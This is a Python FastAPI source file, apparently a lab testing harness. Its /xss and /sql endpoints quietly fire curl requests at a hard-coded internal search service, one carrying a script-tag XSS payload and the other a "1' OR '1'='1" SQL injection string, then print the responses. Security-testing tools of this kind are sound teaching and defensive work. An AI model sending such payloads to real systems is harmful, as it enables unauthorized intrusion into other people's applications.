
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
import subprocess

app = FastAPI()

templates = Jinja2Templates(directory="templates")

TARGET_URL = "http://10.10.0.1:8000/search"


# Display the same website for every endpoint
def display_website(request: Request):
    return templates.TemplateResponse(
        request=request,
        name="index.html"
    )


# Execute and display command output in VS Code terminal
def run_command(command, test_name):

    print("\n" + "=" * 65, flush=True)
    print("EXECUTING:", test_name, flush=True)

    print(
        subprocess.list2cmdline(command),
        flush=True
    )

    print("=" * 65, flush=True)

    try:
        result = subprocess.run(
            command,
            capture_output=True,
            text=True,
            timeout=15
        )

        print("EXIT CODE:", result.returncode, flush=True)

        print(
            "RESPONSE:",
            result.stdout[:3000],
            flush=True
        )

        if result.stderr:
            print(
                "ERROR:",
                result.stderr[:2000],
                flush=True
            )

    except subprocess.TimeoutExpired:
        print("ERROR: Request timed out", flush=True)

    except FileNotFoundError:
        print("ERROR: curl.exe not found", flush=True)

    except Exception as error:
        print("ERROR:", str(error), flush=True)


# HOME PAGE
@app.get("/", response_class=HTMLResponse)
def home(request: Request):

    return display_website(request)


# XSS ENDPOINT
@app.get("/xss", response_class=HTMLResponse)
def xss(request: Request):

    command = [
        "curl.exe",
        "-X", "POST",
        TARGET_URL,
        "--data-urlencode",
        "q=<script>alert(1)</script>"
    ]

    run_command(command, "XSS LAB TEST")

    return display_website(request)


# SQL ENDPOINT
@app.get("/sql", response_class=HTMLResponse)
def sql(request: Request):

    command = [
        "curl.exe",
        "-G",
        TARGET_URL,
        "--data-urlencode",
        "id=1' OR '1'='1"
    ]

    run_command(command, "SQL LAB TEST")

    return display_website(request)
